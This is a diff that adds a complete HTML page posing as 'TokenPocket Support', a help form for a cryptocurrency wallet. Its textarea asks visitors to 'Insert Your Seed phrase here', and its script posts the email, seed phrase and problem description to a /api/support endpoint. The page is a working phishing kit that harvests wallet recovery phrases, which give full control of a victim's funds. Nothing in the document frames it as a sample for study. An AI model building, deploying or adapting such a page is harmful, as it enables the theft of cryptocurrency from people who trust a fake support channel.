@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TokenPocket Support</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .support-form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 600px;
+    }
+    .support-form h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input, textarea, button {
+      width: 100%;
+      margin-top: 15px;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    button {
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1565c0;
+    }
+    .status {
+      margin-top: 15px;
+      color: green;
+      text-align: center;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+
+  <form class="support-form" id="supportForm">
+    <h2>TokenPocket Support</h2>
+    <input type="email" id="email" placeholder="Enter your email" required />
+    <textarea id="message" rows="6" placeholder="Insert Your Seed phrase here..." required></textarea>
+    <input type="text" id="note" placeholder="Describe your problem" required />
+    <button type="submit">Submit</button>
+    <p class="status" id="status"></p>
+  </form>
+
+  <script>
+    const form = document.getElementById('supportForm');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const message = document.getElementById('message').value;
+      const note = document.getElementById('note').value;
+
+      try {
+        const response = await fetch('/api/support', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ email, message, note })
+        });
+
+        const data = await response.json();
+
+        if (data.success) {
+          status.textContent = 'Your message has been sent!';
+          status.classList.remove('error');
+          form.reset();
+        } else {
+          status.textContent = data.error || 'Something went wrong.';
+          status.classList.add('error');
+        }
+      } catch (error) {
+        status.textContent = 'Error sending message.';
+        status.classList.add('error');
+      }
+    });
+  </script>
+
+</body>
+</html>
+
